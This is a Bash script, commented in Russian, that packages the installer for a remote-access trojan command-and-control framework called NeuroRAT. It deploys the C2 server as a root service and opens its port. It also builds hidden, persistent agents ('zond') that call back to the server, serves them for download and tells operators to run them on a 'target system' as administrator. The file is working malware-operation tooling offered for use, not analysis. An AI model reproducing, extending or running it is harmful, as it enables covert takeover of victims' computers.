#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}====== Создание установочного пакета NeuroRAT C2 Framework ======${NC}"

# Создаем временную директорию для установочного пакета
TEMP_DIR="/tmp/neurorat_installer"
mkdir -p $TEMP_DIR

# Копируем необходимые файлы
echo -e "${YELLOW}Копирование файлов...${NC}"
cp -r ./* $TEMP_DIR/ 2>/dev/null || true

# Проверяем наличие скриптов установки
if [ ! -f "$TEMP_DIR/install_server.sh" ]; then
    echo -e "${RED}Не найден файл install_server.sh! Создаем его...${NC}"
    # Создаем скрипт установки сервера
    cat > "$TEMP_DIR/install_server.sh" << 'EOF'
#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}====== Установка NeuroRAT C2 Framework на Ubuntu ======${NC}"

# Создаем директорию установки
INSTALL_DIR="/opt/neurorat"
mkdir -p $INSTALL_DIR

# Проверка наличия установщика пакетов
echo -e "${YELLOW}Проверка и установка зависимостей...${NC}"
apt update
apt install -y python3 python3-pip python3-venv git unzip wget curl

# Создаем виртуальное окружение
echo -e "${YELLOW}Создание виртуального окружения...${NC}"
python3 -m venv $INSTALL_DIR/venv
source $INSTALL_DIR/venv/bin/activate

# Копируем файлы из текущей директории или клонируем из репозитория
if [ -f "server_api.py" ]; then
    echo -e "${YELLOW}Копирование локальных файлов...${NC}"
    cp -r ./* $INSTALL_DIR/
else
    echo -e "${RED}Файлы не найдены в текущей директории!${NC}"
    echo -e "${YELLOW}Укажите директорию с исходными файлами или нажмите Enter для выхода:${NC}"
    read src_dir
    if [ ! -z "$src_dir" ] && [ -d "$src_dir" ]; then
        cp -r $src_dir/* $INSTALL_DIR/
    else
        echo -e "${RED}Директория не указана или не существует. Выход.${NC}"
        exit 1
    fi
fi

# Установка зависимостей
echo -e "${YELLOW}Установка зависимостей Python...${NC}"
pip install fastapi uvicorn psutil starlette jinja2 python-multipart python-dotenv

# Определение внешнего IP сервера
SERVER_IP=$(curl -s https://ipinfo.io/ip)
echo -e "${GREEN}Обнаружен внешний IP сервера: ${SERVER_IP}${NC}"

# Создаем конфигурационный файл .env
cat > $INSTALL_DIR/.env << EOL
SERVER_HOST="0.0.0.0"
SERVER_PORT=8080
SERVER_URL="http://${SERVER_IP}:8080"
API_KEY="$(openssl rand -hex 32)"
DEBUG=false
EOL

# Создаем директории для хранения данных
mkdir -p $INSTALL_DIR/uploads
mkdir -p $INSTALL_DIR/static
mkdir -p $INSTALL_DIR/templates
mkdir -p $INSTALL_DIR/builds

# Создаем systemd сервис
echo -e "${YELLOW}Создание systemd сервиса...${NC}"
cat > /etc/systemd/system/neurorat.service << EOL
[Unit]
Description=NeuroRAT C2 Server
After=network.target

[Service]
User=root
WorkingDirectory=${INSTALL_DIR}
ExecStart=${INSTALL_DIR}/venv/bin/python3 ${INSTALL_DIR}/server_api.py
Restart=always
RestartSec=10
Environment="PATH=${INSTALL_DIR}/venv/bin:${PATH}"

[Install]
WantedBy=multi-user.target
EOL

# Активируем и запускаем сервис
systemctl daemon-reload
systemctl enable neurorat.service
systemctl start neurorat.service

# Настраиваем файрвол
echo -e "${YELLOW}Настройка файрвола...${NC}"
ufw allow 8080/tcp
ufw status

# Создаем скрипт для билда зонда
cat > $INSTALL_DIR/build_zond.sh << EOL
#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

SERVER_IP="\$(curl -s https://ipinfo.io/ip)"
BUILDS_DIR="${INSTALL_DIR}/builds"
TIMESTAMP=\$(date +%Y%m%d_%H%M%S)

echo -e "\${BLUE}====== Создание билда NeuroRAT Agent (Zond) ======\${NC}"
echo -e "\${YELLOW}IP сервера: \${SERVER_IP}\${NC}"

# Проверка и создание директории для сохранения билдов
mkdir -p \${BUILDS_DIR}

# Запускаем процесс билда
echo -e "\${YELLOW}Создание билда агента...\${NC}"
cd ${INSTALL_DIR}

# Обновляем конфигурацию агента с текущим IP
echo -e "\${YELLOW}Настройка зонда на IP сервера (\${SERVER_IP})...\${NC}"

# Подключаем виртуальное окружение
source ${INSTALL_DIR}/venv/bin/activate

# Создаем файл конфигурации для агента
cat > \${BUILDS_DIR}/agent_config.json << EOCFG
{
    "server_url": "http://\${SERVER_IP}:8080",
    "agent_id": "zond_\${TIMESTAMP}",
    "check_interval": 30,
    "hide_console": true,
    "persistence": true
}
EOCFG

# Копируем шаблон агента и внедряем конфигурацию
cp ${INSTALL_DIR}/neurorat_agent.py \${BUILDS_DIR}/zond_\${TIMESTAMP}.py

# Внедряем конфигурацию в код агента
sed -i "s|SERVER_URL = .*|SERVER_URL = \"http://\${SERVER_IP}:8080\"|g" \${BUILDS_DIR}/zond_\${TIMESTAMP}.py

# Компилируем агента в исполняемый файл (если есть pyinstaller)
if command -v pyinstaller &> /dev/null || pip show pyinstaller &> /dev/null; then
    echo -e "\${YELLOW}Компиляция агента в исполняемый файл...\${NC}"
    pip install pyinstaller
    cd \${BUILDS_DIR}
    pyinstaller --onefile --noconsole zond_\${TIMESTAMP}.py -n neurorat_agent_\${TIMESTAMP}
    
    if [ -f "\${BUILDS_DIR}/dist/neurorat_agent_\${TIMESTAMP}" ]; then
        cp \${BUILDS_DIR}/dist/neurorat_agent_\${TIMESTAMP} \${BUILDS_DIR}/
        echo -e "\${GREEN}Исполняемый файл создан: \${BUILDS_DIR}/neurorat_agent_\${TIMESTAMP}\${NC}"
    else
        echo -e "\${RED}Не удалось создать исполняемый файл.\${NC}"
        echo -e "\${YELLOW}Используем Python-скрипт в качестве агента.\${NC}"
        cp \${BUILDS_DIR}/zond_\${TIMESTAMP}.py \${BUILDS_DIR}/neurorat_agent_\${TIMESTAMP}.py
    fi
else
    echo -e "\${YELLOW}PyInstaller не найден, создаем агента в виде Python-скрипта...\${NC}"
    cp \${BUILDS_DIR}/zond_\${TIMESTAMP}.py \${BUILDS_DIR}/neurorat_agent_\${TIMESTAMP}.py
fi

# Проверяем результат
if [ -f "\${BUILDS_DIR}/neurorat_agent_\${TIMESTAMP}" ] || [ -f "\${BUILDS_DIR}/neurorat_agent_\${TIMESTAMP}.py" ]; then
    echo -e "\${GREEN}Билд успешно создан!\${NC}"
    echo -e "\${GREEN}Ссылка для скачивания: http://\${SERVER_IP}:8080/download/neurorat_agent_\${TIMESTAMP}\${NC}"
    echo -e "\${YELLOW}Путь к файлу: \${BUILDS_DIR}/neurorat_agent_\${TIMESTAMP}\${NC}"
    
    # Добавляем README с инструкцией
    cat > \${BUILDS_DIR}/README_agent_\${TIMESTAMP}.txt << EOREADME
NeuroRAT Agent (Zond) build \${TIMESTAMP}

Настроен на сервер: http://\${SERVER_IP}:8080
ID агента: zond_\${TIMESTAMP}

Инструкция по установке:
1. Загрузите агент на целевую систему
2. Запустите от имени администратора
3. Агент автоматически подключится к серверу

Доступ к серверу: http://\${SERVER_IP}:8080
EOREADME

else
    echo -e "\${RED}Ошибка при создании билда!\${NC}"
    exit 1
fi

echo -e "\${BLUE}====== Билд успешно создан ======\${NC}"
EOL

# Делаем скрипт билдера исполняемым
chmod +x $INSTALL_DIR/build_zond.sh

# Создаем символическую ссылку для удобства
ln -sf $INSTALL_DIR/build_zond.sh /usr/local/bin/build_zond

echo -e "${GREEN}====== Установка NeuroRAT C2 Framework завершена ======${NC}"
echo -e "${GREEN}Сервер запущен и доступен по адресу: http://${SERVER_IP}:8080${NC}"
echo -e "${YELLOW}Для билда зонда выполните команду: build_zond${NC}"
echo -e "${YELLOW}Логи сервера: journalctl -u neurorat.service -f${NC}"
EOF

    chmod +x "$TEMP_DIR/install_server.sh"
fi

if [ ! -f "$TEMP_DIR/download_route_patch.sh" ]; then
    echo -e "${RED}Не найден файл download_route_patch.sh! Создаем его...${NC}"
    # Создаем скрипт для добавления маршрута скачивания билдов
    cat > "$TEMP_DIR/download_route_patch.sh" << 'EOF'
#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}====== Добавление маршрута для скачивания билдов ======${NC}"

# Находим подходящее место в server_api.py для добавления маршрута скачивания файлов
INSTALL_DIR="/opt/neurorat"
FILE_PATH="${INSTALL_DIR}/server_api.py"

# Проверяем наличие директории для билдов
echo -e "${YELLOW}Проверка наличия директории для билдов...${NC}"
mkdir -p ${INSTALL_DIR}/builds

# Добавляем маршрут для скачивания билдов
if grep -q "@app.get(\"/download/{filename\")" "$FILE_PATH"; then
    echo -e "${GREEN}Маршрут скачивания уже существует${NC}"
else
    echo -e "${YELLOW}Добавление маршрута скачивания...${NC}"
    
    # Находим последний маршрут и добавляем наш после него
    sed -i '/^@app.get/!b;:a;n;/^@app.get/ba;i\
@app.get("/download/{filename}")
async def download_file(filename: str):
    """Download a built agent file"""
    builds_dir = "builds"
    file_path = os.path.join(builds_dir, filename)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, filename=filename)
' "$FILE_PATH"
    
    echo -e "${GREEN}Маршрут скачивания успешно добавлен в server_api.py${NC}"
fi

# Перезапускаем сервис для применения изменений
echo -e "${YELLOW}Перезапуск сервиса...${NC}"
systemctl restart neurorat.service

echo -e "${GREEN}====== Маршрут для скачивания билдов успешно добавлен ======${NC}"
EOF

    chmod +x "$TEMP_DIR/download_route_patch.sh"
fi

# Создаем установочный скрипт setup.sh
cat > $TEMP_DIR/setup.sh << 'EOF'
#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Проверка прав root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Запустите скрипт с правами суперпользователя (root)${NC}"
  exit 1
fi

echo -e "${BLUE}====== Установка NeuroRAT C2 Framework ======${NC}"

# Запускаем установку сервера
echo -e "${YELLOW}Запуск установки сервера...${NC}"
bash ./install_server.sh

# Добавляем маршрут скачивания билдов
echo -e "${YELLOW}Добавление маршрута скачивания...${NC}"
bash ./download_route_patch.sh

SERVER_IP=$(curl -s https://ipinfo.io/ip)

echo -e "${GREEN}====== Установка завершена! ======${NC}"
echo -e "${GREEN}Доступ к панели: http://${SERVER_IP}:8080${NC}"
echo -e "${YELLOW}Для создания агента выполните команду: build_zond${NC}"
EOF

chmod +x $TEMP_DIR/setup.sh

# Создаем README.md
cat > $TEMP_DIR/README.md << 'EOF'
# NeuroRAT C2 Framework - Установочный пакет

## Установка на сервер

1. Загрузите архив на сервер
2. Распакуйте: `tar -xzf neurorat_installer.tar.gz`
3. Запустите: `sudo ./setup.sh`

## Особенности

- Работает без Docker, подходит для слабых серверов
- Автоматическое определение IP сервера
- Автоматическая настройка зонда на IP сервера
- Создание билдов зонда через `build_zond`

## Требования

- Ubuntu 18.04 или выше
- Python 3.6+

## Управление

- Просмотр логов: `journalctl -u neurorat.service -f`
- Перезапуск сервера: `systemctl restart neurorat.service`
- Остановка сервера: `systemctl stop neurorat.service`
- Создание билда: `build_zond`
EOF

# Создаем архив
ARCHIVE_NAME="neurorat_installer.tar.gz"
echo -e "${YELLOW}Создание архива ${ARCHIVE_NAME}...${NC}"
tar -czf $ARCHIVE_NAME -C $TEMP_DIR .

# Очищаем временную директорию
rm -rf $TEMP_DIR

echo -e "${GREEN}====== Установочный пакет создан ======${NC}"
echo -e "${GREEN}Файл: ${ARCHIVE_NAME}${NC}"
echo -e "${YELLOW}Для установки на сервере:${NC}"
echo -e "1. Загрузите ${ARCHIVE_NAME} на сервер"
echo -e "2. Распакуйте: tar -xzf ${ARCHIVE_NAME}"
echo -e "3. Запустите: sudo ./setup.sh"
EOF